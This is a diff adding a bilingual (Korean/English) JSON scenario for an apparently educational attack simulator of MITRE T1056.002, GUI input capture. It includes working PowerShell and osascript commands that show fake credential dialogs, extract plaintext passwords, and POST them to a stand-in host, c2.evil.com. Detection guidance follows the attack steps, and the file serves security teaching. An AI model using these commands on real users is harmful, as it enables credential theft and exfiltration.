@@ -1,0 +1,193 @@
+{
+  "id": "T1056.002",
+  "title": "GUI Input Capture 시뮬레이션",
+  "titleEn": "GUI Input Capture Simulation",
+  "duration": 7,
+  "phases": [
+    { "label": "🎭 가짜 프롬프트 생성", "labelEn": "🎭 Fake Prompt Creation", "steps": [0] },
+    { "label": "🔓 자격 증명 수집", "labelEn": "🔓 Credential Harvest", "steps": [1, 2] },
+    { "label": "📤 데이터 유출", "labelEn": "📤 Data Exfiltration", "steps": [3] },
+    { "label": "🔍 탐지 분석", "labelEn": "🔍 Detection Analysis", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker\n(Foothold)", "x": 50, "y": 80 },
+    { "id": "fakeprompt", "label": "Fake\nPrompt", "x": 200, "y": 30 },
+    { "id": "victim", "label": "Victim\nUser", "x": 200, "y": 130 },
+    { "id": "creds", "label": "Stolen\nCredentials", "x": 380, "y": 80 },
+    { "id": "c2", "label": "C2\nServer", "x": 480, "y": 80 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "fakeprompt", "minStep": 0 },
+    { "from": "fakeprompt", "to": "victim", "minStep": 1 },
+    { "from": "victim", "to": "creds", "minStep": 2 },
+    { "from": "creds", "to": "c2", "minStep": 3 }
+  ],
+  "desktopIcons": [
+    { "name": "PowerShell", "icon": "🖥️" },
+    { "name": "Windows Security", "icon": "🛡️" },
+    { "name": "creds.txt", "icon": "📄" },
+    { "name": "Event Viewer", "icon": "📋" },
+    { "name": "Sysmon", "icon": "🔍" }
+  ],
+  "steps": [
+    {
+      "cmd": "$cred = $host.ui.PromptForCredential('Windows Security', 'Your session has expired. Please re-enter your credentials to continue.', \"$env:USERDOMAIN\\$env:USERNAME\", '')",
+      "out": "[*] Fake credential prompt displayed\n[*] Title: 'Windows Security'\n[*] Message: 'Your session has expired...'\n[*] Pre-filled username: CORP\\jsmith\n[*] Waiting for user input...\n\n[Windows Security Dialog Box]\n┌─────────────────────────────────────┐\n│  🛡️ Windows Security               │\n│                                     │\n│  Your session has expired.          │\n│  Please re-enter your credentials.  │\n│                                     │\n│  Username: CORP\\jsmith              │\n│  Password: ********                 │\n│                                     │\n│      [  OK  ]    [ Cancel ]         │\n└─────────────────────────────────────┘",
+      "def": "[ScriptBlock Logging] PromptForCredential called from PowerShell - potential GUI input capture",
+      "defAction": "Tool: PowerShell PromptForCredential\nDialog Title: Windows Security\nPre-filled: CORP\\jsmith\nCalling Process: powershell.exe\nRisk Level: High\nAction: Block credential prompt, alert user via separate channel",
+      "desc": "공격자가 PowerShell의 PromptForCredential 메서드를 사용하여 Windows 보안 대화상자와 동일한 가짜 인증 프롬프트를 표시합니다. 사용자 이름이 미리 채워져 있어 비밀번호만 입력하면 됩니다.",
+      "descEn": "The attacker uses PowerShell's PromptForCredential method to display a fake authentication prompt identical to Windows Security. The username is pre-filled, requiring only the password.",
+      "stepTitle": "PromptForCredential로 가짜 Windows 보안 대화상자 생성",
+      "stepTitleEn": "Create Fake Windows Security Dialog via PromptForCredential",
+      "feynman": "진짜 은행 창구 바로 옆에 완벽히 똑같은 가짜 창구를 설치합니다. 직원 이름표도 같고, 유니폼도 같습니다. 고객이 '세션이 만료되었다'는 안내를 받으면, 자연스럽게 비밀번호를 다시 입력합니다. 가짜인지 알 수 없을 정도로 정교합니다.",
+      "feynmanEn": "Setting up a perfect replica counter next to the real bank teller. Same name tag, same uniform. When told 'session expired,' customers naturally re-enter passwords. So convincing they can't tell it's fake.",
+      "expert": "System.Management.Automation.Host.PSHostUserInterface.PromptForCredential()은 Windows 표준 자격 증명 대화상자를 생성합니다. 반환되는 PSCredential 객체에서 GetNetworkCredential().Password로 평문 비밀번호를 추출할 수 있습니다. 진짜 UAC(consent.exe)와 달리 Secure Desktop에서 실행되지 않아 스크린샷 캡처가 가능합니다.",
+      "expertEn": "PromptForCredential() creates a standard Windows credential dialog. The returned PSCredential object's GetNetworkCredential().Password extracts plaintext. Unlike real UAC (consent.exe), it doesn't run on Secure Desktop.",
+      "defTooltip": "🔐 가짜 Windows 보안 대화상자 생성! 자격 증명 수집 시도!",
+      "defTooltipEn": "🔐 Fake Windows Security dialog created! Credential harvesting attempt!",
+      "hackerLog": {
+        "title": "fake_prompt.log",
+        "lines": [
+          "[14:30:00] PromptForCredential 호출",
+          "[14:30:01] 가짜 대화상자 표시: 'Windows Security'",
+          "[14:30:02] 사전 입력: CORP\\jsmith",
+          "[14:30:03] 사용자 입력 대기 중..."
+        ]
+      },
+      "terms": [
+        { "term": "PromptForCredential", "def": "PowerShell에서 사용자 자격 증명을 요청하는 대화상자를 생성하는 메서드" },
+        { "term": "Secure Desktop", "def": "UAC 프롬프트를 위한 격리된 보안 데스크톱 환경" }
+      ]
+    },
+    {
+      "cmd": "$plainPass = $cred.GetNetworkCredential().Password\nWrite-Output \"[CAPTURED] User: $($cred.UserName) | Pass: $plainPass\"",
+      "out": "[CAPTURED] User: CORP\\jsmith | Pass: W1nt3r2026!Secure\n\n[*] Credential captured successfully\n[*] Domain: CORP\n[*] Username: jsmith\n[*] Password: W1nt3r2026!Secure (plaintext)\n[*] Timestamp: 2026-01-20 14:30:45\n[*] Writing to C:\\Users\\jsmith\\AppData\\Local\\Temp\\cache\\creds.dat",
+      "def": "[EDR] Plaintext credential extraction from PSCredential object",
+      "defAction": "Tool: PSCredential.GetNetworkCredential()\nCaptured: CORP\\jsmith / W1nt3r2026!Secure\nOutput: %TEMP%\\cache\\creds.dat\nRisk Level: Critical\nAction: Force password reset for jsmith, investigate PowerShell execution chain",
+      "desc": "사용자가 가짜 프롬프트에 비밀번호를 입력하면, GetNetworkCredential().Password로 평문 비밀번호가 즉시 추출됩니다. 공격자는 이를 로컬 파일에 저장합니다.",
+      "descEn": "When the user enters the password in the fake prompt, GetNetworkCredential().Password immediately extracts the plaintext password. The attacker saves it to a local file.",
+      "stepTitle": "PSCredential에서 평문 비밀번호 추출",
+      "stepTitleEn": "Extract Plaintext Password from PSCredential",
+      "feynman": "가짜 창구에서 고객이 비밀번호를 적어서 넘기면, 사기꾼은 그 종이를 즉시 복사하여 숨겨둡니다. PSCredential은 보안을 위해 비밀번호를 암호화하지만, GetNetworkCredential()은 원래 평문으로 되돌립니다.",
+      "feynmanEn": "When the customer writes down the password at the fake counter, the scammer immediately copies and hides the paper. PSCredential encrypts the password for security, but GetNetworkCredential() converts it back to plaintext.",
+      "expert": "PSCredential 객체는 SecureString으로 비밀번호를 저장하지만, GetNetworkCredential()은 이를 NetworkCredential 객체로 변환하면서 평문 Password 속성을 노출합니다. 이는 PowerShell의 의도된 동작이며, 스크립트 내에서 자격 증명을 사용하기 위한 합법적 메커니즘이 악용되는 사례입니다.",
+      "expertEn": "PSCredential stores passwords as SecureString, but GetNetworkCredential() converts to NetworkCredential, exposing the plaintext Password property. This is intended PowerShell behavior - a legitimate credential mechanism being abused.",
+      "defTooltip": "🔐 평문 비밀번호 추출 완료! CORP\\jsmith 자격 증명 탈취!",
+      "defTooltipEn": "🔐 Plaintext password extracted! CORP\\jsmith credentials stolen!",
+      "hackerLog": {
+        "title": "cred_capture.log",
+        "lines": [
+          "[14:30:45] 사용자가 비밀번호 입력",
+          "[14:30:45] GetNetworkCredential() 호출",
+          "[14:30:46] 평문 추출: W1nt3r2026!Secure",
+          "[14:30:47] creds.dat에 저장 완료"
+        ]
+      },
+      "terms": [
+        { "term": "SecureString", "def": ".NET에서 민감한 문자열을 메모리에서 암호화하여 보관하는 타입" },
+        { "term": "GetNetworkCredential", "def": "SecureString을 평문 NetworkCredential로 변환하는 메서드" }
+      ]
+    },
+    {
+      "cmd": "# macOS AppleScript 변형\nosascript -e 'display dialog \"macOS needs your password to continue.\" default answer \"\" with hidden answer with title \"System Preferences\" with icon caution'",
+      "out": "button returned:OK, text returned:MyM@cP@ss2026!\n\n[*] macOS GUI Input Capture successful\n[*] Dialog Type: AppleScript display dialog\n[*] Title: System Preferences\n[*] Captured Password: MyM@cP@ss2026!\n[*] User clicked OK without suspicion\n\n[참고] 이 대화상자는 실제 macOS 시스템 환경설정과 구별 불가능",
+      "def": "[macOS Endpoint] Suspicious osascript execution - credential dialog displayed",
+      "defAction": "Tool: AppleScript osascript\nDialog: System Preferences (fake)\nOS: macOS\nCaptured: MyM@cP@ss2026!\nRisk Level: High\nAction: Monitor osascript executions, deploy PPPC controls",
+      "desc": "macOS에서는 AppleScript의 display dialog를 사용하여 시스템 환경설정과 동일한 인증 대화상자를 생성할 수 있습니다. hidden answer 옵션으로 비밀번호 필드가 마스킹됩니다.",
+      "descEn": "On macOS, AppleScript's display dialog creates an authentication dialog identical to System Preferences. The hidden answer option masks the password field.",
+      "stepTitle": "macOS AppleScript를 이용한 가짜 인증 대화상자",
+      "stepTitleEn": "Fake Authentication Dialog via macOS AppleScript",
+      "feynman": "Mac에서도 같은 수법이 가능합니다. '시스템 환경설정에서 비밀번호가 필요합니다'라는 창이 뜨면, 대부분의 사용자는 의심 없이 비밀번호를 입력합니다. macOS의 보안 경고 창과 완전히 동일하게 만들 수 있습니다.",
+      "feynmanEn": "The same trick works on Mac. When 'System Preferences needs your password' appears, most users enter it without suspicion. It can be made completely identical to macOS security prompts.",
+      "expert": "osascript -e 'display dialog'은 표준 macOS 대화상자를 생성합니다. with icon caution은 시스템 경고 아이콘을, with hidden answer는 비밀번호 마스킹을 추가합니다. macOS Mojave 이후 PPPC(Privacy Preferences Policy Control)로 osascript 접근을 제어할 수 있지만, 사용자 동의를 받은 앱에서는 여전히 실행 가능합니다.",
+      "expertEn": "osascript creates standard macOS dialogs. 'with icon caution' adds the system warning icon, 'with hidden answer' adds password masking. Since Mojave, PPPC can control osascript access, but it remains executable from user-consented apps.",
+      "defTooltip": "🔐 macOS 가짜 인증 대화상자! osascript로 비밀번호 탈취!",
+      "defTooltipEn": "🔐 macOS fake auth dialog! Password stolen via osascript!",
+      "hackerLog": {
+        "title": "macos_capture.log",
+        "lines": [
+          "[14:35:00] osascript 실행",
+          "[14:35:01] 가짜 System Preferences 대화상자 표시",
+          "[14:35:15] 사용자 비밀번호 입력: OK 클릭",
+          "[14:35:16] 평문 비밀번호 획득 완료"
+        ]
+      },
+      "terms": [
+        { "term": "osascript", "def": "macOS에서 AppleScript를 실행하는 명령줄 도구" },
+        { "term": "PPPC", "def": "Privacy Preferences Policy Control, macOS의 개인정보 접근 제어" }
+      ]
+    },
+    {
+      "cmd": "Invoke-WebRequest -Uri 'https://c2.evil.com/collect' -Method POST -Body @{user='CORP\\jsmith';pass='W1nt3r2026!Secure';host=$env:COMPUTERNAME;ts=(Get-Date -Format 'o')} -UseBasicParsing",
+      "out": "StatusCode        : 200\nStatusDescription : OK\nContent           : {\"status\":\"received\",\"id\":\"cred-2847\"}\n\n[*] Credentials exfiltrated to C2 server\n[*] Target: https://c2.evil.com/collect\n[*] Data: CORP\\jsmith / W1nt3r2026!Secure\n[*] Hostname: WRK-JSMITH01\n[*] Timestamp: 2026-01-20T14:31:00+09:00\n[*] C2 confirmed receipt: cred-2847",
+      "def": "[SIEM] Outbound HTTPS POST to suspicious domain with credential-like data pattern",
+      "defAction": "Tool: Invoke-WebRequest (PowerShell)\nC2: c2.evil.com/collect\nExfiltrated: CORP\\jsmith credentials\nHostname: WRK-JSMITH01\nRisk Level: Critical\nAction: Block domain, terminate session, force password reset",
+      "desc": "탈취한 자격 증명을 C2 서버로 HTTPS POST를 통해 전송합니다. 호스트 이름과 타임스탬프도 함께 전송하여 공격자가 어떤 시스템에서 어떤 계정이 탈취되었는지 파악합니다.",
+      "descEn": "Stolen credentials are exfiltrated to the C2 server via HTTPS POST. Hostname and timestamp are included so the attacker knows which system and account were compromised.",
+      "stepTitle": "탈취한 자격 증명을 C2 서버로 유출",
+      "stepTitleEn": "Exfiltrate Stolen Credentials to C2 Server",
+      "feynman": "가짜 창구에서 복사한 비밀번호 종이를 범죄 조직의 본부(C2 서버)로 보냅니다. 어떤 건물(호스트)의 어떤 주민(사용자)인지, 언제 탈취했는지 정보를 함께 보내 본부에서 체계적으로 관리합니다.",
+      "feynmanEn": "Sending the copied password paper from the fake counter to the criminal organization's headquarters (C2 server). Including which building (host) and resident (user), and when it was stolen for organized management.",
+      "expert": "Invoke-WebRequest는 PowerShell의 HTTP 클라이언트로, -UseBasicParsing은 IE 의존성을 제거합니다. HTTPS를 통해 DPI를 회피하며, POST body에 자격 증명, 호스트명, ISO 8601 타임스탬프를 포함합니다. C2는 cred-2847 ID를 반환하여 수집된 자격 증명을 데이터베이스에서 추적합니다.",
+      "expertEn": "Invoke-WebRequest is PowerShell's HTTP client; -UseBasicParsing removes IE dependency. HTTPS evades DPI, with POST body containing credentials, hostname, and ISO 8601 timestamp. C2 returns cred-2847 ID for database tracking.",
+      "defTooltip": "🔐 자격 증명 C2 서버로 유출! HTTPS POST 탐지!",
+      "defTooltipEn": "🔐 Credentials exfiltrated to C2! HTTPS POST detected!",
+      "hackerLog": {
+        "title": "exfil.log",
+        "lines": [
+          "[14:31:00] C2 서버 연결: c2.evil.com",
+          "[14:31:01] HTTPS POST 전송: 자격 증명 + 메타데이터",
+          "[14:31:02] C2 응답: 200 OK (cred-2847)",
+          "[14:31:03] 유출 완료, 로컬 캐시 정리"
+        ]
+      },
+      "terms": [
+        { "term": "C2 Server", "def": "Command & Control 서버, 공격자가 원격으로 멀웨어를 제어하는 서버" },
+        { "term": "DPI", "def": "Deep Packet Inspection, 네트워크 패킷 내용을 분석하는 기술" }
+      ]
+    },
+    {
+      "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} | Where-Object { $_.Message -match 'PromptForCredential|display dialog' } | Format-List TimeCreated,Message",
+      "out": "TimeCreated : 2026-01-20 14:30:00\nMessage     : ScriptBlock text (1 of 1):\n              $cred = $host.ui.PromptForCredential(\n                'Windows Security',\n                'Your session has expired...',\n                \"$env:USERDOMAIN\\$env:USERNAME\",\n                ''\n              )\n              $plainPass = $cred.GetNetworkCredential().Password\n              Invoke-WebRequest -Uri 'https://c2.evil.com/collect'...\n\n[탐지 요약]\n- ScriptBlock Logging이 전체 스크립트 기록\n- PromptForCredential + GetNetworkCredential 조합 = GUI Input Capture\n- C2 통신 URL 식별: c2.evil.com\n- 권장: ScriptBlock Logging + AMSI 활성화로 사전 차단",
+      "def": "[SIEM] ScriptBlock Logging captured full GUI input capture attack chain",
+      "defAction": "Tool: PowerShell ScriptBlock Logging (Event ID 4104)\nDetected: Full attack script\nFunctions: PromptForCredential + GetNetworkCredential\nC2 URL: c2.evil.com/collect\nRisk Level: Critical\nAction: Enable AMSI, deploy PowerShell Constrained Language Mode, block C2",
+      "desc": "PowerShell ScriptBlock Logging(Event ID 4104)이 전체 공격 스크립트를 기록했습니다. PromptForCredential과 GetNetworkCredential의 조합, C2 URL까지 모든 공격 체인이 가시화됩니다.",
+      "descEn": "PowerShell ScriptBlock Logging (Event ID 4104) recorded the entire attack script. The combination of PromptForCredential and GetNetworkCredential, plus the C2 URL, makes the full attack chain visible.",
+      "stepTitle": "ScriptBlock Logging으로 전체 공격 스크립트 탐지",
+      "stepTitleEn": "Detect Full Attack Script via ScriptBlock Logging",
+      "feynman": "보안 카메라가 사기꾼의 행동을 처음부터 끝까지 녹화한 것입니다. 가짜 창구를 설치하고(PromptForCredential), 비밀번호를 읽어내고(GetNetworkCredential), 범죄 조직에 보고한(C2 통신) 모든 장면이 기록되어 있습니다.",
+      "feynmanEn": "Security cameras recorded the scammer's actions from start to finish. Setting up the fake counter (PromptForCredential), reading the password (GetNetworkCredential), and reporting to the crime ring (C2 communication) - all scenes captured.",
+      "expert": "PowerShell v5+ ScriptBlock Logging(Event ID 4104)은 실행되는 모든 스크립트 블록을 기록합니다. 난독화된 코드도 실행 시점에서 복호화된 상태로 기록됩니다. AMSI(Anti-Malware Scan Interface)와 결합하면 PromptForCredential 호출을 사전에 차단할 수 있으며, Constrained Language Mode는 이런 .NET 타입 접근을 제한합니다.",
+      "expertEn": "PowerShell v5+ ScriptBlock Logging (Event ID 4104) records all executed script blocks, even deobfuscated at runtime. Combined with AMSI, PromptForCredential calls can be pre-emptively blocked. Constrained Language Mode restricts such .NET type access.",
+      "defTooltip": "🔐 ScriptBlock Logging으로 전체 공격 체인 포착!",
+      "defTooltipEn": "🔐 Full attack chain captured via ScriptBlock Logging!",
+      "hackerLog": {
+        "title": "detection_report.log",
+        "lines": [
+          "[15:00:00] Event ID 4104 분석 시작",
+          "[15:00:03] PromptForCredential 호출 식별",
+          "[15:00:05] GetNetworkCredential 사용 확인",
+          "[15:00:08] C2 URL 추출: c2.evil.com/collect"
+        ]
+      },
+      "terms": [
+        { "term": "ScriptBlock Logging", "def": "PowerShell이 실행하는 모든 스크립트 블록을 이벤트 로그에 기록하는 기능" },
+        { "term": "AMSI", "def": "Anti-Malware Scan Interface, 실행 시점에서 악성 스크립트를 검사하는 인터페이스" }
+      ]
+    }
+  ],
+  "processTree": {
+    "name": "cmd.exe",
+    "pid": 5120,
+    "children": [
+      {
+        "name": "powershell.exe",
+        "pid": 5621,
+        "children": [
+          { "name": "CredentialPrompt", "pid": 5622, "children": [] },
+          { "name": "Invoke-WebRequest", "pid": 5623, "children": [] }
+        ]
+      }
+    ]
+  }
+}
